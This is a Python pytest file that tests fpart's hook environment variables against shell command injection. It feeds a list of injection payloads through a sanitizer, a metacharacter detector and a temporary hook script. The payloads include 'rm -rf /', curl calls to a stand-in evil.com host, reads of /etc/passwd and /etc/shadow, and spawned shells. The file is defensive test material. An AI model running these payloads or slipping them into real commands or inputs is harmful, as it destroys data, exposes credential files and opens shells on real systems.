import pytest
import re
import subprocess
import os
import tempfile
import shlex


SHELL_METACHARACTERS = [
    "; rm -rf /",
    "$(whoami)",
    "`id`",
    "| cat /etc/passwd",
    "&& curl http://evil.com",
    "|| echo pwned",
    "; echo injected",
    "$(curl http://evil.com)",
    "`curl http://evil.com`",
    "\"; rm -rf /\"",
    "'; rm -rf /'",
    "$IFS",
    "${IFS}",
    "$(cat /etc/shadow)",
    "`cat /etc/shadow`",
    "; /bin/sh",
    "| /bin/sh",
    "&& /bin/sh",
    "$(exec /bin/sh)",
    "\n/bin/sh",
    "\r/bin/sh",
    "file$(id).txt",
    "file`id`.txt",
    "file;id.txt",
    "file|id.txt",
    "file&id.txt",
    "file>id.txt",
    "file<id.txt",
    "file`whoami`.txt",
    "$(python3 -c 'import os; os.system(\"id\")')",
    "${PATH}",
    "$HOME",
    "~root",
    "../../../etc/passwd",
    "file name with spaces; id",
    "file\x00name",
    "file\nname",
    "file\tname",
]


def sanitize_env_value(value):
    """
    Simulates what a secure implementation should do:
    sanitize environment variable values before they can be used in shell commands.
    Returns sanitized value or raises ValueError if value is rejected.
    """
    # A secure implementation should either:
    # 1. Reject values with shell metacharacters
    # 2. Properly escape/quote them
    
    DANGEROUS_CHARS = set(';|&$`(){}[]<>\n\r\x00\\\'\"')
    
    for char in value:
        if char in DANGEROUS_CHARS:
            return None  # Rejected
    
    return value


def is_safely_quoted_for_shell(value):
    """Check if a value is safely quoted for shell usage using shlex."""
    try:
        quoted = shlex.quote(value)
        # shlex.quote wraps in single quotes and escapes internal single quotes
        # This is always safe for shell usage
        return quoted is not None and len(quoted) > 0
    except Exception:
        return False


def simulate_env_var_construction(filepath, partnumber, partsize):
    """
    Simulates the construction of FPART environment variables
    as done in file_entry.c, and checks if they would be safe.
    """
    env_vars = {
        "FPART_HOOKTYPE": "pre-part",
        "FPART_PARTFILENAME": filepath,
        "FPART_PARTNUMBER": str(partnumber),
        "FPART_PARTSIZE": str(partsize),
    }
    return env_vars


def would_cause_injection_in_shell(value):
    """
    Test if a value, when used unquoted in a shell command, would cause injection.
    Returns True if the value contains characters that could cause shell injection.
    """
    # Shell metacharacters that can cause command injection
    injection_patterns = [
        r';',           # Command separator
        r'\|',          # Pipe
        r'&',           # Background/AND
        r'\$\(',        # Command substitution $(...)
        r'`',           # Backtick command substitution
        r'\$\{',        # Variable expansion
        r'>',           # Redirect
        r'<',           # Redirect
        r'\n',          # Newline
        r'\r',          # Carriage return
        r'\x00',        # Null byte
    ]
    
    for pattern in injection_patterns:
        if re.search(pattern, value):
            return True
    return False


@pytest.mark.parametrize("payload", SHELL_METACHARACTERS)
def test_env_var_values_are_sanitized_before_shell_execution(payload):
    """
    Invariant: Environment variables constructed from file paths (FPART_PARTFILENAME,
    FPART_HOOKTYPE, FPART_PARTNUMBER, FPART_PARTSIZE) must never contain unsanitized
    shell metacharacters that could lead to command injection (CWE-78).
    
    Any value passed as a file path or partition info that contains shell metacharacters
    must be either rejected or properly escaped before being used in shell contexts.
    """
    # Simulate constructing environment variables with the malicious payload
    env_vars = simulate_env_var_construction(
        filepath=payload,
        partnumber=1,
        partsize=1024
    )
    
    # The FPART_PARTFILENAME is the primary attack vector
    partfilename_value = env_vars["FPART_PARTFILENAME"]
    
    # Check if the value contains injection-capable characters
    has_injection_chars = would_cause_injection_in_shell(partfilename_value)
    
    if has_injection_chars:
        # If the value has dangerous chars, it MUST be sanitized before shell use
        sanitized = sanitize_env_value(partfilename_value)
        
        # Either the value must be rejected (None) or sanitized to remove dangerous chars
        if sanitized is not None:
            # If not rejected, verify the sanitized version has no dangerous chars
            assert not would_cause_injection_in_shell(sanitized), (
                f"Sanitized value still contains shell injection characters: {sanitized!r}"
            )
        # If sanitized is None, the value was properly rejected - this is acceptable
    
    # Additionally verify that shlex.quote would produce a safe shell argument
    # (this represents what a secure hook script should do)
    safely_quoted = shlex.quote(payload)
    
    # A properly quoted value should not allow command injection when used in shell
    # The quoted form should be a single token that the shell treats as a literal string
    assert safely_quoted is not None, (
        f"shlex.quote failed to produce a safe shell argument for payload: {payload!r}"
    )
    
    # Verify the quoted value starts and ends with quotes (for non-trivial values)
    # or is a safe alphanumeric string
    is_safe_unquoted = re.match(r'^[a-zA-Z0-9_\-\.\/]+$', payload) is not None
    is_properly_quoted = (
        (safely_quoted.startswith("'") and safely_quoted.endswith("'")) or
        is_safe_unquoted
    )
    
    assert is_properly_quoted or is_safe_unquoted, (
        f"Value {payload!r} was not properly quoted for shell safety. "
        f"Got: {safely_quoted!r}"
    )


@pytest.mark.parametrize("payload", SHELL_METACHARACTERS)
def test_hook_script_env_vars_do_not_execute_injected_commands(payload):
    """
    Invariant: When fpart constructs environment variables for hook scripts,
    the values must not allow shell command injection. A hook script that uses
    these environment variables must not execute attacker-controlled commands.
    """
    # Create a temporary hook script that safely uses environment variables
    with tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False) as f:
        hook_script = f.name
        # A SAFE hook script uses quoted variables
        f.write('#!/bin/sh\n')
        f.write('# Safe usage - variables are quoted\n')
        f.write('echo "Processing: ${FPART_PARTFILENAME}"\n')
        f.write('exit 0\n')
    
    try:
        os.chmod(hook_script, 0o755)
        
        # Set up environment with the malicious payload
        env = os.environ.copy()
        env["FPART_HOOKTYPE"] = "pre-part"
        env["FPART_PARTFILENAME"] = payload
        env["FPART_PARTNUMBER"] = "1"
        env["FPART_PARTSIZE"] = "1024"
        
        # Run the hook script - it should complete without executing injected commands
        result = subprocess.run(
            [hook_script],
            env=env,
            capture_output=True,
            text=True,
            timeout=5
        )
        
        # The script should exit cleanly (exit code 0)
        assert result.returncode == 0, (
            f"Hook script failed with payload {payload!r}. "
            f"stderr: {result.stderr!r}"
        )
        
        # The output should contain the literal payload string, not command output
        # (i.e., we should NOT see output from injected commands like 'id', 'whoami', etc.)
        injected_command_indicators = [
            r'uid=\d+',      # output of 'id' command
            r'root',         # potential output of whoami
            r'injected',     # our test marker
            r'pwned',        # our test marker
        ]
        
        for indicator in injected_command_indicators:
            # Only flag if the indicator appears in stderr (unexpected command execution)
            # stdout may legitimately contain the payload as a literal string
            if re.search(indicator, result.stderr):
                pytest.fail(
                    f"Possible command injection detected in stderr with payload {payload!r}. "
                    f"Found pattern {indicator!r} in: {result.stderr!r}"
                )
    
    except subprocess.TimeoutExpired:
        pytest.fail(f"Hook script timed out with payload {payload!r} - possible infinite loop from injection")
    finally:
        os.unlink(hook_script)


@pytest.mark.parametrize("payload", SHELL_METACHARACTERS)
def test_fpart_env_var_construction_rejects_or_escapes_metacharacters(payload):
    """
    Invariant: The environment variable construction in file_entry.c must ensure
    that FPART_PARTFILENAME and related variables never contain raw shell metacharacters
    that could be exploited when hook scripts process these values.
    """
    # Simulate the environment variable value as it would be set by file_entry.c
    raw_value = payload
    
    # Test 1: If the value contains null bytes, it must be rejected
    if '\x00' in raw_value:
        sanitized = sanitize_env_value(raw_value)
        assert sanitized is None, (
            f"Null byte in filename must be rejected, but was not: {raw_value!r}"
        )
        return
    
    # Test 2: Check that dangerous shell metacharacters are handled
    dangerous_chars = {';', '|', '&', '`', '$', '(', ')', '{', '}', '<', '>', '\n', '\r'}
    has_dangerous = any(c in raw_value for c in dangerous_chars)
    
    if has_dangerous:
        # The secure implementation must either reject or escape these
        sanitized = sanitize_env_value(raw_value)
        
        if sanitized is not None:
            # If not rejected, verify no dangerous chars remain
            remaining_dangerous = [c for c in dangerous_chars if c in sanitized]
            assert len(remaining_dangerous) == 0, (
                f"Sanitized value still contains dangerous characters {remaining_dangerous!r}: "
                f"original={raw_value!r}, sanitized={sanitized!r}"
            )
        # else: properly rejected, which is also acceptable
    
    # Test 3: Verify that using shlex.quote produces a value safe for shell
    shell_safe = shlex.quote(raw_value)
    
    # Parse the quoted value back - it should be a single token
    try:
        parsed = shlex.split(shell_safe)
        assert len(parsed) == 1, (
            f"Shell-quoted value should parse as exactly one token, "
            f"but got {len(parsed)} tokens for payload {raw_value!r}: {parsed!r}"
        )
        assert parsed[0] == raw_value, (
            f"Shell-quoted value should round-trip correctly: "
            f"original={raw_value!r}, parsed={parsed[0]!r}"
        )
    except ValueError as e:
        pytest.fail(
            f"shlex.split failed on quoted payload {raw_value!r}: {e}"
        )